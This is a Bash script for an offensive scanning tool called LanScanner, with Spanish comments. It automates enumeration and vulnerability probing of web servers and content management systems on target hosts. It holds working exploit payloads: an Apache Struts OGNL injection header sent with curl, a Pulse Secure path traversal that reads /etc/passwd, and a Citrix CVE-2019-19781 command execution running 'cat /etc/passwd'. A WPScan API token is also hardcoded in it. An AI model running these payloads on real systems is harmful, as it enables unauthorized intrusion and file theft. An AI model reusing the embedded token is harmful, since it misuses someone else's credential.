#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
# https://github.com/ticarpi/jwt_tool
# PoC Suite3
# https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
# Identificar redes con  http://www.ip-calc.com/
# https://github.com/Exploit-install/Routerhunter-2.0
# curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40  https://$subdominio > webClone/https-$subdominio.html
##

OKBLUE='\033[94m'
OKRED='\033[91m'
OKYELLOW="\033[0;33m" 
OKGREEN='\033[92m'
RESET='\e[0m'



#/usr/share/seclists/Usernames/cirt-default-usernames.txt
#############################

live_hosts=".datos/total-host-vivos.txt"
arp_list=".datos/lista-arp.txt"
smb_list=".escaneos/lista-smb.txt"
dns_list=".escaneos/lista-dns.txt"
mass_scan_list=".escaneos/lista-mass-scan.txt"
ping_list=".escaneos/lista-ping.txt"
smbclient_list=".escaneos/lista-smbclient.txt"
prefijo="" 
# "../"  --> escaneo LAN (../ips.txt)
# (vacio) -->  escaneo internet (reporte/maltego.csv)

################## Config HERE ####################
port_scan_num=1;
min_ram=400;
hilos_web=30;
DOMINIO_EXTERNO=''
DOMINIO_INTERNO=''
max_perl_instancias=50;
max_nmap_instances=5;
oracle_passwords="/usr/share/wordlists/oracle_default_userpass.txt"
common_subdomains="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
######################################

function print_ascii_art {
cat << "EOF"
   __               __                                 
  / /  __ _ _ __   / _\ ___ __ _ _ __  _ __   ___ _ __ 
 / /  / _` | '_ \  \ \ / __/ _` | '_ \| '_ \ / _ \ '__|
/ /__| (_| | | | | _\ \ (_| (_| | | | | | | |  __/ |   
\____/\__,_|_| |_| \__/\___\__,_|_| |_|_| |_|\___|_|   
                                                       

					daniel.torres@owasp.org
					Version: 1.7

EOF
}


	
print_ascii_art


while getopts ":i:s:c:d:m:n:l:e:p:" OPTIONS
do
            case $OPTIONS in
            s)     SUBNET_FILE=$OPTARG;;
            i)     IP_LIST_FILE=$OPTARG;;
			c)	   PROXYCHAINS=$OPTARG;;
            d)     DOMINIO_EXTERNO=$OPTARG;;
			l)     LANGUAGE=$OPTARG;;
            m)     MODE=$OPTARG;;
			n)     internet=$OPTARG;;
			e)     START=$OPTARG;;
			p)     PORT_SCANNER=$OPTARG;;
            ?)     printf "invalid option: -$OPTARG\n" $0
                          exit 2;;
           esac
done

SUBNET_FILE=${SUBNET_FILE:=NULL}
IP_LIST_FILE=${IP_LIST_FILE:=NULL}
MODE=${MODE:=NULL} # assessment/hacking
DOMINIO_EXTERNO=${DOMINIO_EXTERNO:=NULL}
PROXYCHAINS=${PROXYCHAINS:=NULL} # s//n
internet=${internet:=NULL} # s/n
LANGUAGE=${LANGUAGE:=NULL} # en/es
START=${START:=NULL} # enumeration
PORT_SCANNER=${PORT_SCANNER:=NULL} #nmap/naabu/masscan/nmap_masscan/nmap_naabu/masscan_naabu
echo "[+] MODE $MODE PORT_SCANNER $PORT_SCANNER SUBNET_FILE $SUBNET_FILE IP_LIST_FILE $IP_LIST_FILE DOMINIO_EXTERNO $DOMINIO_EXTERNO LANGUAGE $LANGUAGE"


common_user_list="/usr/share/lanscanner/usuarios-$LANGUAGE.txt"


#if [[ "$MODE" == NULL || "$PORT_SCANNER" == NULL ]]; then 
if [[ "$MODE" == NULL  ]]; then 

cat << "EOF"

Options: 

-m : Mode [assessment/hacking]	
	assessment: normal test + ssl checks + slowloris (use for reports)
	hacking: normal test + virtual hosts test + svwar VoIP tests (use for hacking)	
-c : Use proxychains [s/n]
-d : domain
-l : en/es
-p : port scanner [nmap/naabu/masscan/nmap_masscan/nmap_naabu/masscan_naabu]
-f : forzar modo "internet"
-s : enumeration: start from enumeration (no host discovery, no port scan)

Definicion del alcance:
	-s : Lista con las subredes a escanear (Formato CIDR 0.0.0.0/24)
	-i : Lista con las IP a escanear

Ejemplo 2: Escanear el listado de IPs (completo) con masscan y naabu
	lanscanner.sh -m normal -i lista.txt -d ejemplo.com -p masscan_naabu

Ejemplo 3: Escanear el listado de subredes (completo) 
	lanscanner.sh -m hacking -s subredes.txt -d ejemplo.com -p nmap_masscan

Ejemplo 3: Escanear el listado de subredes (forzar escaneo como IPs publicas) 
	lanscanner.sh -m hacking -s subredes.txt -d ejemplo.com -p nmap_masscan -n s

Ejemplo 4: Only enumeration
	lanscanner.sh -m hacking -e enumeration -l en -d dominio -i lista.txt


EOF

exit
fi
######################


#aceptar versiones antiguas de SSL
export OPENSSL_CONF=/usr/share/lanscanner/sslv1.conf


function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}

function enumeracionDefecto () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Default enumeration ($proto : $host : $port)"

    egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|NodeJS|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" .enumeracion/"$host"_"$port"_webData.txt 
	greprc=$?
	if [[ $greprc -eq 0  ]];then
		
		if [ "$PROXYCHAINS" == "n" ]; then 
			echo -e "\t\t[+] Revisando folders ($host - default)"						
			web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt 
			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 

			echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
			web-buster.pl -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
			egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  
			sleep 1 
		fi  
		
		echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"						
		$proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt >> .enumeracion/"$host"_"$port"_webadmin.txt
		sleep 1

	fi		
}

function enumeracionSharePoint () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Enumerar Sharepoint ($proto : $host : $port)"	

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${MODE} != *"proxy"* ]];then 
		echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"		
		echo "web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1 -e \'something went wrong\'" > logs/enumeracion/"$host"_SharePoint_webdirectorios.txt 	
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -e 'something went wrong' -q 1  >> logs/enumeracion/"$host"_SharePoint_webdirectorios.txt 	
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_SharePoint_webdirectorios.txt 	> .enumeracion/"$host"_SharePoint_webdirectorios.txt
		sleep 1					
	fi	


    echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
    echo "web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -q 1 -e \'something went wrong\'" > logs/enumeracion/"$host"_SharePoint_webarchivos.txt  
	$proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -e 'something went wrong' -q 1 >> logs/enumeracion/"$host"_SharePoint_webarchivos.txt  
    egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_SharePoint_webarchivos.txt >> .enumeracion/"$host"_SharePoint_webarchivos.txt  
    sleep 1
	

}

function enumeracionIIS () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Enumerar IIS ($proto : $host : $port)"	
    
	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${MODE} != *"proxy"* ]];then 
		echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"		
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &		
		sleep 1					
	fi	

    egrep -iq "IIS/6.0|IIS/5.1" .enumeracion/"$host"_"$port"_webData.txt
    IIS6=$?
    if [[ $IIS6 -eq 0 ]];then
        echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
        echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
        $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 					
        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
    
    fi

    echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
    echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
    $proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt

    echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
    $proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_iis_webadmin.txt
    egrep --color=never "^200|^401" logs/enumeracion/"$host"_iis_webadmin.txt >> .enumeracion/"$host"_iis_webadmin.txt  
    sleep 1

	if [ "$PROXYCHAINS" == "n" ]; then 
		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 > logs/enumeracion/"$host"_iis_webarchivos.txt
		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_iis_webarchivos.txt  >> .enumeracion/"$host"_iis_webarchivos.txt  
		sleep 1

		echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m webservices -s $proto -q 1 > logs/enumeracion/"$host"_iis_webarchivos.txt  
		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_iis_webarchivos.txt  >> .enumeracion/"$host"_iis_webarchivos.txt  
		sleep 1

		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"								
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m backdoorIIS -s $proto -q 1 > logs/vulnerabilidades/"$host"_iis_webshell.txt
		egrep --color=never "^200|^302|^401" logs/vulnerabilidades/"$host"_iis_webshell.txt >> .vulnerabilidades/"$host"_iis_webshell.txt
		sleep 1

		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto -q 1 > logs/vulnerabilidades/"$host"_iis_backupWeb.txt
		egrep --color=never "^200|^301|^302|^401" logs/vulnerabilidades/"$host"_iis_backupWeb.txt  >> .vulnerabilidades/"$host"_iis_webarchivos.txt 
		sleep 1	

		$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_iis_shortname.txt 2>/dev/null							   
		grep '\[+\]' logs/enumeracion/"$ip"_iis_shortname.txt  |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$ip"_iis_shortname.txt	

	fi      

}



function enumeracionApache () {  
   proto=$1
   host=$2
   port=$3  
   echo -e "\t[+] Enumerar Apache ($proto : $host : $port)"	

#webData.pl -t $ip -d /nonexists134 -p $port -e todo -l /dev/null -r 1 2>/dev/null | cut -d "~" -f1

   	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${MODE} != *"proxy"* ]];then 
        echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
        web-buster.pl -t $host  -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
        sleep 1					
	fi

    #  CVE-2021-4177								
    echo -e "\t\t[+] Revisando apache traversal)" 
    $proxychains apache-traversal.py  --target  $host --port $port > logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  	
    grep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt

    echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
    $proxychains web-buster.pl -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
    egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt > .enumeracion/"$host"_"$port"_webadmin.txt 
    sleep 1

	echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
    $proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  
    egrep --color=never "^200|^302|^401" logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  
    sleep 1

	if [ "$PROXYCHAINS" == "n" ]; then 

		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
		web-buster.pl -t $host  -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 | egrep --color=never "^200" >> .enumeracion/"$host"_"$port"_webarchivos.txt  &
		sleep 1

		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m backupApache -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
		sleep 1
		

		echo -e "\t\t[+] Revisando backups de archivos genericos ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
		sleep 1

		echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 | egrep --color=never "^200" > .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  &
		#web-buster.pl -t $host -p $port -h $hilos_web -d / -m default -s http -q 1 > logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  
	#								egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  
		sleep 1
		
		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m backdoorApache -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_webshell.txt 
		egrep --color=never "^200|^302|^401"  logs/vulnerabilidades/"$host"_"$port"_webshell.txt  >> .vulnerabilidades/"$host"_"$port"_webshell.txt 								
		sleep 1
		
		echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m registroHabilitado -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt 
		egrep --color=never "Registro habilitado" logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt  >> .vulnerabilidades/"$host"_"$port"_registroHabilitado.txt
		sleep 1
		
		echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & # solo a la carpeta logs
	fi  
    
    
    

	if [[ $internet == "s" && "$MODE" == "assessment" ]]; then
		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
		echo "$proxychains  nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
	fi

	if [ $internet == "n" ]; then 

		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
		$proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt        		
		egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_archivosCGI.txt | awk '{print $2}' >> servicios/cgi.txt; 
		cat servicios/cgi.txt >> .enumeracion/"$host"_"$port"_archivosCGI.txt
		sleep 1	

	else
		egrep -i "is behind" .enumeracion/"$host"_"$port"_wafw00f.txt
		greprc=$?
		if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
			web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt        		
			egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_archivosCGI.txt | awk '{print $2}' >> servicios/cgi.txt; 
			cat servicios/cgi.txt >> .enumeracion/"$host"_"$port"_archivosCGI.txt
			sleep 1								
		fi	
	fi
	

	#echo -e "\t\t[+] Revisando docker socks ($host - Apache/nginx)"
	#curl -XGET --unix-socket /var/run/docker.sock $proto://$host:$port/images/json > logs/vulnerabilidades/"$host"_docker_images.txt
	#grep "Containers" logs/vulnerabilidades/"$host"_docker_images.txt > .vulnerabilidades/"$host"_docker_images.txt
}


function apacheStrutsCheck () {  
   echo -e "\t[+] Apache struts check"
	for line in $(cat servicios/Apache-Struts-files.txt); do
		echo -e "\t\t[+] Checking $line"
		proto=`echo $line | cut -d ":" -f 1 | cut -d ' ' -f2` #  http/https
		host_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80			
		path=`echo $line | cut -d "/" -f 4 ` #minuscula
		host=`echo $host_port | cut -d ":" -f 1` #puede ser subdominio tb
		port=`echo $host_port | cut -d ":" -f 2`				
		$proxychains curl --insecure  --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable: $line')).(#ros.flush())}" "$line" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt
	done	
	grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
	
			
}

function enumeracionTomcat () {  
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Enumerar Tomcat ($proto : $host : $port)"

   $proxychains curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto://$host:$port')).(#ros.flush())}" "$proto://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null	
	grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt	
        
    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${MODE} != *"proxy"* ]];then 
        echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"								
        web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &			
        sleep 1;
    fi									
    
    echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
    $proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m tomcat -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_webarchivos.txt 
    egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  
    
    if [ "$PROXYCHAINS" == "n" ]; then 
		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt 
		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
		sleep 1	  
	fi  
    
	  
}



function enumeracionCMS () { 
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Enumerar CMSs ($proto : $host : $port)"	

    echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
    $proxychains nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
    sleep 1

    #######  drupal  ######
    grep -qi drupal .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 										
        echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
        $proxychains droopescan scan drupal -u  "$proto"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_droopescan.txt								
        cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt																																								
    fi

    #######  wordpress  ######
    grep -qi wordpress .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        wpscan  --update  >/dev/null   
        echo -e "\t\t[+] Wordpress user enumeration ("$proto"://"$host":"$port")"
		echo "$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --output json --url "$proto"://"$host":"$port" --format json"
        $proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --output json --url "$proto"://"$host":"$port" --format json > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json
		echo -e "\t\t[+] Revisando vulnerabilidades de wordpress "
        $proxychains wpscan --disable-tls-checks  --random-user-agent --url "$proto"://$host/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
        

        #$proxychains msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $host;run;exit" > logs/vulnerabilidades/"$host"_3389_BlueKeep.txt
        
        grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
        greprc=$?
        if [[ $greprc -eq 0 ]];then 		            
            url=`cat logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
			echo -e "\t\t[+] url $url ($host: $port)"
            if [[ ${url} == *"$host"*  ]];then 
				echo -e "\t\t[+] Redireccion en wordpress $url ($host: $port)"
				$proxychains wpscan --disable-tls-checks --enumerate u  --random-user-agent --format json --url $url > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json
            	$proxychains wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
			else
				echo -e "\t\t[+] Ya lo escaneamos por dominio" 
			fi
            
            
        fi

        grep "Title" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
        strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "Title" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
        if [[ ! -s .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt  ]] ; then
            strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "out of date" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
            cp logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
        fi
        

        strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$host"_"$port"_configuracionInseguraWordpress.txt
        cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json | wpscan-parser.py > .vulnerabilidades/"$host"_"$port"_wpUsers.txt
        grep -i users logs/vulnerabilidades/"$host"_"$port"_wpUsers.json -m1 -b1 -A20 > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt
    fi
                                
    ###################################	 

    #######  citrix  ######
    grep -qi citrix .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de citrix ($host)"
        
        $proxychains CVE-2019-19781.sh $host $port "cat /etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt
        egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt > .vulnerabilidades/"$host"_"$port"_citrixVul.txt
        
    fi
    ###################################	

    #######  Pulse secure  ######
    grep -qi pulse .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"
        
        $proxychains curl --path-as-is -s -k "$proto://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt
        egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt > .vulnerabilidades/"$host"_"$port"_pulseVul.txt
        
    fi
    ##################################		


    #######  OWA  ######
    egrep -qi "Outlook|owa" .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de OWA($host)"
        
        $proxychains owa.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_owaVul.txt
        egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_owaVul.txt > .vulnerabilidades/"$host"_"$port"_owaVul.txt
        
    fi
